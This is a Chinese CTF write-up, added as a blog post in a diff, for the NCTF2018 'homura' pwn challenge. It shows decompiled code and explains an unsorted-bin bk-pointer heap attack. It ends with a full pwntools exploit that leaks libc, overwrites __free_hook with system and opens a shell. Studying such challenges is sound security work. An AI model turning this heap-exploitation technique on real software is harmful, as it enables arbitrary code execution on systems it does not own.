@@ -1,0 +1,352 @@
+---
+layout:     post
+title:      "NCTF2018之homura"
+subtitle:   " 不知名的Unsorted_bin利用 "
+date:       2019-03-13 12:00:00
+author:     "Chris"
+catalog: true
+tags:
+    - Pwn
+
+
+---
+
+>这道题有点难度，比赛结束时也没人提交flag，后来有时间自己研究了一下，有了新的思路
+
+## CheckSec
+
+```python
+
+[*] '/home/chris/homura'
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      PIE enabled
+```
+
+## 程序源码
+
+**1.add函数**
+
+```c
+
+__int64 __fastcall sub_C7C(__int64 a1, unsigned int a2)
+{
+  unsigned int i; // [rsp+1Ch] [rbp-4h]
+
+  for ( i = 0; (signed int)i < (signed int)a2; ++i )
+  {
+    read(0, (void *)((signed int)i + a1), 1uLL);
+    if ( *(_BYTE *)((signed int)i + a1) == 10 )
+    {
+      *(_BYTE *)((signed int)i + a1) = 0;
+      return i;
+    }
+  }
+  return a2;
+}
+
+int sub_CED()
+{
+  char nptr; // [rsp+0h] [rbp-20h]
+  unsigned __int64 v2; // [rsp+18h] [rbp-8h]
+
+  v2 = __readfsqword(0x28u);
+  sub_C7C(&nptr, 16LL);
+  return atoi(&nptr);
+}
+
+
+int add()
+{
+  void **v1; // rbx
+  _QWORD *v2; // rbx
+  signed int i; // [rsp+4h] [rbp-1Ch]
+  signed int v4; // [rsp+8h] [rbp-18h]
+  signed int v5; // [rsp+Ch] [rbp-14h]
+
+  for ( i = 0; i <= 14 && qword_202100[i]; ++i )
+    ;
+  if ( i > 14 )
+    return puts("full!");
+  qword_202100[i] = malloc(0x10uLL);
+  v1 = (void **)qword_202100[i];
+  *v1 = malloc(0x10uLL);
+  printf("length of your name:");
+  v4 = sub_CED();
+  if ( v4 > 15 )
+    v4 = 16;
+  printf("your name:");
+  sub_C7C(*qword_202100[i], (unsigned int)v4);
+  printf("size of your message:");
+  v5 = sub_CED();
+  if ( v5 <= 128 || v5 > 4095 )
+    v5 = 128;
+  v2 = qword_202100[i];
+  v2[1] = malloc(v5 + 16);
+  printf("please leave your message:");
+  sub_C7C(qword_202100[i][1], (unsigned int)v5);
+  return puts("Done!");
+}
+```
+**2.delete函数**
+
+```c
+int delete()
+{
+  signed int v1; // [rsp+Ch] [rbp-4h]
+
+  printf("index:");
+  v1 = sub_CED();
+  if ( v1 < 0 || v1 > 14 )
+    return puts("invalid");
+  free((void *)*qword_202100[v1]);
+  free((void *)qword_202100[v1][1]);
+  free(qword_202100[v1]);
+  qword_202100[v1] = 0LL;
+  return puts("Done!");
+}
+```
+
+**3.modify函数**
+
+```c
+int modify()
+{
+  int result; // eax
+  signed int v1; // [rsp+8h] [rbp-18h]
+  signed int v2; // [rsp+Ch] [rbp-14h]
+
+  printf("index:");
+  v2 = sub_CED();
+  if ( v2 < 0 || v2 > 14 )
+    return puts("invalid");
+  if ( qword_202100[v2] )
+    qword_2020E0 = (__int64)qword_202100[v2];
+  result = qword_2020E0;
+  if ( qword_2020E0 )
+  {
+    printf("size:");
+    v1 = sub_CED();
+    if ( v1 > strlen(*(const char **)(qword_2020E0 + 8)) )
+      v1 = 16;
+    printf("Hello %s you can modify your message >", *(_QWORD *)qword_2020E0);
+    sub_C7C(*(_QWORD *)(qword_2020E0 + 8), (unsigned int)v1);
+    result = puts("Done!");
+  }
+  return result;
+}
+```
+
+**4.隐藏函数**
+
+```c
+unsigned __int64 sub_1016()
+{
+  signed int v1; // [rsp+Ch] [rbp-34h]
+  char s; // [rsp+10h] [rbp-30h]
+  __int64 v3; // [rsp+28h] [rbp-18h]
+  unsigned __int64 v4; // [rsp+38h] [rbp-8h]
+
+  v4 = __readfsqword(0x28u);
+  if ( dword_202098 == -559038737 )
+  {
+    dword_202098 = 0;
+    printf("index:");
+    v1 = sub_CED();
+    if ( v1 >= 0 && v1 <= 14 )
+    {
+      if ( qword_202100[v1] )
+        qword_2020E0 = (__int64)qword_202100[v1];
+      if ( qword_2020E0 )
+      {
+        printf("modify your message>");
+        memset(&s, 0, 0x28uLL);
+        sub_C7C(&s, 8LL);
+        printf("Here you can modify once again!>", 8LL);
+        sub_C7C(&v3, 8LL);
+        memcpy(*(void **)(qword_2020E0 + 8), &s, 0x20uLL);
+        puts("Done!");
+      }
+    }
+    else
+    {
+      puts("invalid");
+    }
+  }
+  return __readfsqword(0x28u) ^ v4;
+}
+```
+## 程序分析
+
+c代码运用二级指针操作，分析出结构体：
+
+```c
+struct note {  //malloc(0x10)
+
+char *name; // malloc(0x10)
+
+char *message; // malloc(0x90<=mem<=0x100f)
+
+};
+
+```
+
+
+* add函数在添加时 输入的数据末尾有置零处理，且不存在溢出。
+* delete函数free后对note指针置零，防止UAF重用。
+* modify函数可用来泄露name指针的数据；且有一处逻辑漏洞，导致可对free后的message堆块进行重写
+* 隐藏函数，有和modify函数相似的漏洞，但在我实际利用过程中并没有发挥实质性的作用，就不多说
+
+## 漏洞利用
+
+1.利用Fast_bin的管理缺陷，利用UAF泄露堆地址。
+
+2.**在我审查了Unsorted_bin部分相关的源码后，发现它的摘链是从双向链表底部开始，且并没有检查bk指针的合法性，于是可以修改bk指针，申请到指向任意地址的堆块(需要伪造 防止再次申请到不合法地址而报错)**
+
+如下图：
+
+修改前
+![](/img/pic/homura/1.jpg)
+
+修改后(修改0x55fe417cc310的bk为伪造chunk)
+![](/img/pic/homura/2.jpg)
+
+all提示‘corrupted’这是gdb插件检测到的，虽然这样看起来破坏了unsortedbin双向链表，但实际上并不影响后续分配。
+
+3.于是乎在合法堆块中伪造chunk，再申请到该chunk，同时就覆盖内存下方note结构的name指针为含有main_arena的堆地址，泄露libc地址
+
+4.释放又重用伪造的chunk，将note结构的message指针覆盖为free_hook;再modify该message，往free_hook填入system
+
+详细利用过程见EXP
+
+## EXP
+
+```python
+
+#!usr/bin/python
+# -*- coding: utf-8 -*-
+from pwn import *
+
+def change(data,rd="\x0a"):
+    p.recvuntil(data)
+    return u64(p.recvuntil(rd,drop=True).ljust(8,"\x00"))
+
+def g():
+    gdb.attach(p)
+    raw_input()
+
+def add(nl,n,ml,m):
+    p.recvuntil(">>")
+    p.sendline(str(1))
+    p.recvuntil("length of your name:")
+    if nl==-1:
+       p.sendline(str(nl))
+    else:  
+        p.sendline(str(nl))
+        p.recvuntil("your name:")
+        p.send(n)
+    p.recvuntil("size of your message:")
+    p.sendline(str(ml))
+    p.recvuntil("please leave your message:")
+    p.sendline(str(m))
+
+
+def remove(idx):
+    p.recvuntil(">>")
+    p.sendline(str(2))
+    p.recvuntil("index:")
+    p.sendline(str(idx))
+
+def modfiy(idx,s,m):
+    p.recvuntil(">>")
+    p.sendline(str(3))
+    p.recvuntil("index:")
+    p.sendline(str(idx))
+    p.recvuntil("size:")
+    p.sendline(str(s))
+    p.recvuntil(">")
+    p.sendline(m)
+
+def leak(idx,s,m):
+    p.recvuntil(">>")
+    p.sendline(str(3))
+    p.recvuntil("index:")
+    p.sendline(str(idx))
+    p.recvuntil("size:")
+    p.sendline(str(s))
+    data=change('Hello ',' you')
+    p.recvuntil(">")
+    p.sendline(m)
+    return data
+
+if __name__ == '__main__':
+    libc = ELF("./libc-2.23.so")
+    p = process('./homura')
+    add(12,'1'*10+'\n',0x90,'a'*0x80) #0
+    add(12,'2'*10+'\n',0x90,'b'*0x80) #1
+    add(12,'3'*10+'\n',0x90,'c'*0x80) #2
+    remove(1)
+    remove(0)
+
+    add(-1,'',0x90,'d'*0x80) #0 此时分配到的message_chunk是前面chunk1的
+    heap = leak(0,0x80,'t'*0x38+p64(0x71))   #防止后面free时 检查相邻空闲堆块时候检查失败
+    print "heap : " +hex(heap)
+    add(12,'4'*10+'\n',0x90,'h'*0x60+p64(0)+p64(0xc1)+p64(heap+0x220)+p64(heap+0x320)) #1  此时分配到的message_chunk为前面chunk0的（ 伪造fake_chunk   fd指向 chunk3 / bk指向chunk4）
+    #
+    add(0x10,'5'*8+'\n',0xa0,'e'*0x60) #3
+    add(0x10,'6'*8+'\n',0xa0,'f'*0x80) #4
+    add(0x10,'7'*8+'\n',0xa0,'g'*0x80) #5
+    add(0x10,'8'*8+'\n',0xa0,'h'*0x80) #6
+    modfiy(3,0xa0,'z'*0x10)
+
+    remove(5)
+    remove(3)
+    remove(4)    
+     
+    ### Unsorted Bin  =  (4-->3-->5)
+    
+    modfiy(3,0xa0,p64(heap+0x420)+p64(heap-0xb0+0x70))  # 编辑chunk3的 fd为原样指向chunk5 / bk指向chunk1中伪造的fake_chunk
+
+    ### Unsorted Bin  =  (4->fake-->3-->5)
+
+    add(0x10,'9'*8+'\n',0xa0,'i'*0x8) # 3 此时分配到的message_chunk是前面chunk5的
+    add(0x10,'z'*8+'\n',0xa0,'j'*0x8) # 4 此时分配到的message_chunk是前面chunk3的
+    
+    heap2=heap+0x330  ## heap2中有main_arena+88的libc地址
+    main_arena = 0x3C4B20
+    addr1=heap2 & 0xffff
+    addr2=(heap2 & 0xffff0000)>>16   
+    addr3=(heap2 & 0xffff00000000)>>32
+    add(0x10,'p'*8+'\n',0xa0,'k'*0x8+p64(heap+0x320)+p64(0)*4+p64(0xb0)+p64(0x21)+p16(addr1)+p16(addr2)+p16(addr3)) #5 此时分配到的message_chunk为伪造的fake_chunk  
+ 
+    ## 在伪造的fake_chunk（chunk 0）中填入数据，覆盖到chunk1,因为写入数据时末尾会被置0，所以为了避免覆盖message的指针破坏堆结构，我们将8byte的heap2拆分成6byte分段写（高两位的\x00没用）.
+    
+    libc_addr = leak(1,0x80,'x'*0x60) -88 - main_arena
+
+    '''chunk1 {  
+
+	char *name;  --> heap2
+
+	char *message;
+
+	}'''
+
+    print "libc_addr : "+hex(libc_addr)
+    free_hook = libc_addr + libc.symbols['__free_hook']
+    print "free_hook : "+hex(free_hook)
+    system_addr = libc_addr + libc.symbols['system']
+    
+    add(0x10,'o'*8+'\n',0xa0,'m'*0x80) #6
+    remove(5)
+
+    add(0x10,'/bin/sh\x00'+'\n',0xa0,p64(0)*7+p64(0x21)+p64(heap+0x330)+p64(free_hook)) #5 再次分配到fake_chunk,这次覆盖message的指针为free_hook地址
+    modfiy(1,0x10,p64(system_addr))  #往free_hook写入system
+
+    remove(5)
+    p.interactive()
+
+```
+
+>[文件下载](https://github.com/yxshyj/project/tree/master/pwn/homura)
